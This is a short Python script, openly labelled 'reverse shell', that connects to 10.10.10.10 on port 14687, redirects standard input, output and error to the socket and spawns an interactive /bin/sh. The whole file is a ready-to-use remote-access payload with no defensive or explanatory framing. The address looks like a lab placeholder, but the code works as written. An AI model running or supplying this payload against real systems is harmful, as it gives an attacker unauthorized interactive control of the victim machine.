#!/usr/bin/python
"reverse shell"

import socket,pty,os
s = socket.socket()
s.connect(('10.10.10.10', 14687))
for fd in 0,1,2:os.dup2(s.fileno(), fd)
pty.spawn("/bin/sh")
